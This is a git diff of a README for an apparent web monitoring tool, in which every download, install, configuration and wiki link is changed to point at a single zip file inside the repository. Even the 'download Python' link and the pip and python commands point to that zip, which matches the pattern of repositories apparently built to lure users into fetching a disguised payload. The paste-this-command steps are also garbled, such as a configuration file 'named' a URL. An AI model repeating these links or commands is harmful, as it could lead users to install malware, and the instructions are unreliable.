@@ -1,6 +1,6 @@
 # 🌐 distributed_complete_monitoring_system - Powerful Web Monitoring Made Easy
 
-[![Download from Releases](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip%20from%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip)
+[![Download from Releases](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip%20from%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,29 +28,29 @@ Before downloading, ensure your system meets the following requirements:
 Follow these steps to set up the application on your system:
 
 1. **Download the Software**: 
-   - Visit the [Releases page to download](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip).
+   - Visit the [Releases page to download](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip).
    - Look for the latest version available. Click the link to download the package.
 
 2. **Install Python**:
-   - If you do not have Python installed, download it from [https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip).
+   - If you do not have Python installed, download it from [https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip).
    - Follow the installation instructions for your operating system.
 
 3. **Install Required Packages**:
    - Open your command line interface (Command Prompt on Windows, Terminal on macOS/Linux).
    - Use the following command to install necessary packages:
      ```bash
-     pip install -r https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip
+     pip install -r https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip
      ```
 
 4. **Configuration**:
    - Navigate to your installation folder.
-   - Locate the configuration file (usually named `https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip`).
+   - Locate the configuration file (usually named `https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip`).
    - Customize the settings according to your monitoring needs.
 
 5. **Run the Application**:
    - In your command line interface, run:
      ```bash
-     python https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip
+     python https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip
      ```
    - This command will start the monitoring application.
 
@@ -83,7 +83,7 @@ If you have questions or need assistance, feel free to reach out. You can find s
 
 ## 🔗 Additional Resources
 
-For more detailed documentation and usage examples, check the [GitHub Wiki](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip).
+For more detailed documentation and usage examples, check the [GitHub Wiki](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip).
 
 ## 📄 License
 
@@ -91,4 +91,4 @@ This project is released under the MIT License. You can freely use it while givi
 
 ---
 
-For a hassle-free installation experience, start by visiting the [Releases page to download](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/onomatope/distributed_complete_monitoring_system.zip).
+For a hassle-free installation experience, start by visiting the [Releases page to download](https://raw.githubusercontent.com/Ansuraj31280/distributed_complete_monitoring_system/main/monitor/system_monitoring_complete_distributed_v3.3-alpha.4.zip).
